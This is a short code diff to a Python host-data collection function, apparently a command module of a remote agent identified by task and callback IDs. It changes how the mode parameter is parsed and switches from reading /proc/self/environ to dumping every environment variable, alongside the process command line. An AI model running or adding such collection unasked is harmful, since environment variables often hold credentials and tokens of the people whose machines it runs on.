@@ -40,7 +40,12 @@ def parse_environ(result):
 
 def execute(params, task_id, callback_id):
     start_time = time.time()
-    mode = params.strip().lower() if params else "quick"
+    
+    try:
+        mode = json.loads(params).get("mode", "quick").strip().lower()
+    except Exception:
+        mode = "quick"
+
     home_dir = os.path.expanduser("~")
 
     data = {}
@@ -89,9 +94,8 @@ def execute(params, task_id, callback_id):
     }
 
     # Proc data
-    env_raw = run_cmd(["cat", "/proc/self/environ"])
     data["procdata"] = {
-        "environ": parse_environ(env_raw),
+        "environ": {"success": True, "variables": dict(os.environ)},
         "cmdline": run_cmd(["cat", "/proc/self/cmdline"]),
     }
 
